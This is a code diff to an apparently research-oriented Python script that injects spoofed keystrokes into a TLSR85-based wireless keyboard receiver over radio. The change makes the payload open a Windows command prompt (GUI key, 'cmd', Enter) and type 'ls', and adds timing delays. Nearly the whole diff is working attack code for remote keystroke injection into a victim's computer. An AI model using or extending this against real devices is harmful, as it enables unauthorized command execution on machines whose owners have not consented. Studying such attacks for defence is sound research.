@@ -29,22 +29,28 @@ rate = Tlsr85.RATE
 # TODO put preamble in tlsr85
 preamble =b"\xAA\xAA\xB5"
 
-# TODO try to open terminal and send command ls ("win", delay 1s, "c", "m", "d", delay 1s, "enter", delay 2s "l", "s")
-
-
 attack = [
     trust_keyboard.build_packet(modifiers=[Tlsr85KeyboardModifiers.MODIFIER_GUI_LEFT]),
+    lambda: time.sleep(0.3),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_C]),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_M]),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_D]),
+    lambda: time.sleep(0.3),
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER]),
+    lambda: time.sleep(0.5),
     trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_L]),
     trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_S]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_0]),
-    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_1])
+    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
 # send payload
 common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=common.RF_RATE_2M)
 for payload in attack:
-    for i in range(len(channels)):
-        common.radio.set_channel(channels[i])
-        for _ in range(20):
-            common.radio.transmit_payload_generic(payload=preamble + payload, address=unhexlify(trust_keyboard.base_address.replace(':', '')))
-            time.sleep(0.0001)
+    if callable(payload):
+        payload() # in case we want a delay
+    else:
+        for i in range(len(channels)):
+            common.radio.set_channel(channels[i])
+            for _ in range(20):
+                common.radio.transmit_payload_generic(payload=preamble + payload, address=unhexlify(trust_keyboard.base_address.replace(':', '')))
+                time.sleep(0.0001)
